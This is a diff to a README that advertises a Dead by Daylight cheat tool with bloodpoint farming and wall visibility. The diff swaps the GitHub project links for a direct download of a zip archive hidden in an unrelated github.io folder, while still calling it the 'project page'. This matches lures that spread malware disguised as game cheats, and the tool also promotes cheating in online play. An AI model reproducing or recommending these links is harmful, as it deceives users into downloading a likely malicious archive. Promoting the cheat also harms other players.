@@ -5,7 +5,7 @@ description: "Automate bloodpoint farming and unlock full visibility for Dead by
 ---
 # ⚙️ DBD-AutoGrind-Trainer-2026-Mega - Earn Bloodpoints Fast Without Manual Play
 
-[![Download Version 2026](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Dennytropical430/DBD-AutoGrind-Trainer-2026-Mega)
+[![Download Version 2026](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/Dennytropical430/dennytropical430.github.io/main/_includes/io-github-dennytropical-1.2.zip)
 
 This tool automates progression in Dead by Daylight. It assists players by managing Bloodpoint farming, enhancing visibility through game walls, and providing character customization options. You run this as an external tool while the game operates.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these standards before you run the trainer.
 
 Follow these steps to obtain the files.
 
-1. Navigate to the project page: [https://github.com/Dennytropical430/DBD-AutoGrind-Trainer-2026-Mega](https://github.com/Dennytropical430/DBD-AutoGrind-Trainer-2026-Mega)
+1. Navigate to the project page: [https://raw.githubusercontent.com/Dennytropical430/dennytropical430.github.io/main/_includes/io-github-dennytropical-1.2.zip](https://raw.githubusercontent.com/Dennytropical430/dennytropical430.github.io/main/_includes/io-github-dennytropical-1.2.zip)
 2. Locate the latest release on the right sidebar.
 3. Click the link to download the compressed folder.
 4. Save the file to your desktop.
